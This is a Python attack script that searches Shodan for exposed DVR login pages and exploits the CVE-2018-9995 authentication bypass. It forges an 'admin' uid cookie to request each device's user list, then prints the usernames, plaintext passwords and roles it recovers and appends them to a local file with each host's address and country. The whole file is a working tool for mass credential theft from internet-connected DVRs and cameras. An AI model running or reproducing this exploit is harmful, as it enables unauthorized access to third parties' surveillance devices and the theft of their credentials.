#!/usr/bin/env python
#
# dvr-login.py
# Search SHODAN for DVR Login CVE-2018-9995
# Exploit Author:      Fernandez Ezequiel ( twitter:@capitan_alfa )
# Author: random_robbie

import shodan
import sys
import json
import tableprint as tp
import requests
from time import sleep
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Configuration
API_KEY = "YOURAPI"
SEARCH_FOR = 'html:"/login.rsp"'
session = requests.Session()
class Colors:
    BLUE        = '\033[94m'
    GREEN       = '\033[32m'
    RED         = '\033[0;31m'
    DEFAULT     = '\033[0m'
    ORANGE      = '\033[33m'
    WHITE       = '\033[97m'
    BOLD        = '\033[1m'
    BR_COLOUR   = '\033[1;37;40m'





	
def test_dvr (IP,PORT,CC):
	headers = {}

	fullHost_1  =   "http://"+IP+":"+str(PORT)+"/device.rsp?opt=user&cmd=list"
	host        =   "http://"+IP+":"+str(PORT)+"/"


	try:
		paramsGet = {"opt":"user","cmd":"list"}
		headers = {"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Upgrade-Insecure-Requests":"1","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0","Connection":"close","Accept-Language":"en-GB,en;q=0.5","Accept-Encoding":"gzip, deflate"}
		cookies = {"uid":"admin"}
		rX = requests.get(fullHost_1,headers=headers,cookies=cookies,timeout=10.000)
	except Exception as e:
		print (Colors.RED+" [+] Timed out\n"+Colors.DEFAULT)
		print (e)
		rX = "fail"
		
		
	if rX != "fail":
		badJson = rX.text
		try:
			dataJson = json.loads(badJson)
			totUsr = len(dataJson["list"])   #--> 10
		except Exception as e:
			print (" [+] Error: "+str(e))
			print (" [>] json: "+str(rX))



		print (Colors.GREEN+"\n [+] DVR (url):\t\t"+Colors.ORANGE+str(host)+Colors.GREEN)
		print (" [+] Port: \t\t"+Colors.ORANGE+str(PORT)+Colors.DEFAULT)

		print (Colors.GREEN+"\n [+] Users List:\t"+Colors.ORANGE+str(totUsr)+Colors.DEFAULT)
		print (" ")

		final_data = []
		try:
			for obj in range(0,totUsr):

				temp = []

				_usuario    = dataJson["list"][obj]["uid"]
				_password   = dataJson["list"][obj]["pwd"]
				_role       = dataJson["list"][obj]["role"]

				temp.append(_usuario) 
				temp.append(_password)
				temp.append(_role)

				final_data.append(temp)
				
				hdUsr  = Colors.GREEN + "Username" + Colors.DEFAULT
				hdPass = Colors.GREEN + "Password" + Colors.DEFAULT
				hdRole = Colors.GREEN + "Role ID"  + Colors.DEFAULT

				cabeceras = [hdUsr, hdPass, hdRole]
				text_file = open("./cfg/DVR-Login.cfg", "a")
				text_file.write("http://"+IP+":"+PORT+" - Username: "+str(_usuario)+" Password: "+str(_password)+" - Country: "+CC+"\n")
				text_file.close()

			tp.table(final_data, cabeceras, width=20)

		except Exception as e:
			print ("\n [!]: "+str(e))
			print (" [+] "+ str(dataJson))

		print ("\n")
	else:
		print ("Timeout of Failed")



	
	
try:
        # Setup the api
		api = shodan.Shodan(API_KEY)

        # Perform the search
		result = api.search(SEARCH_FOR,limit=None)

        # Loop through the matches and print each IP
		for service in result['matches']:
				IP = service['ip_str']
				PORT = str(service['port'])
				CC = service['location']['country_name']
				test_dvr (IP,PORT,CC)
except KeyboardInterrupt:
		print ("Ctrl-c pressed ...")
		sys.exit(1)
				
except Exception as e:
		print('Error: %s' % e)
		sys.exit(1)
